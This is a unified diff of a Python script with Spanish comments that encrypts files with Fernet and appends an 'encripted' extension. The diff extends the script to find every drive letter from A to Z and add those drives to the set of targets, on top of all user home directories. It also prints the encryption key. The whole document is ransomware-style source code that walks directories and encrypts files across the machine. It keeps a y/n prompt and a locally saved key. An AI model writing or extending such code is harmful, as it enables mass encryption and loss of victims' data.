@@ -4,6 +4,9 @@ import psutil
 import sys
 import ctypes
 
+
+
+
 if input("Do you want to do this? (y/n)")!="y":
     print(2/0)
 
@@ -28,7 +31,9 @@ extension = 'encripted'
 # Función para generar la clave de cifrado y almacenada en un archivo en el directorio local.
 def generar_key():
     key = Fernet.generate_key()
+    print(key)
     with open('key.key', 'wb') as key_file:
+        print("")
         key_file.write(key)
 
 
@@ -51,6 +56,18 @@ def encrypt(items, key):
 
         os.rename(item, item + '.' + extension)
 
+
+
+def find_drives():
+    L = set()
+    for i in range(ord('a'), ord('z')+1):
+        drive = chr(i)
+        if(os.path.exists(drive +":\\")):
+            L.add(drive.upper()+":\\")
+    return L
+
+
+
 def get_users():
     return {psutil.users()[i][0] for i in range(len(psutil.users()))}
 users = get_users()
@@ -61,6 +78,8 @@ if __name__ == '__main__':
         # Directorio que vamos a cifrar.
         for user in users:
             directories = {'C:\\Users\\'+user+"\\" for user in users}
+        
+        directories.update(find_drives())
 
         # Generación la clave de cifrado y se almacena en una variable.
         generar_key()
@@ -78,7 +97,7 @@ if __name__ == '__main__':
                     if os.path.isdir(path+item):
                         directories.add(path+item+"\\")
                     else:
-                        files.add(path+item) 
+                        files.add(path+item)
                 encrypt(files, key)
 
             except Exception as e:
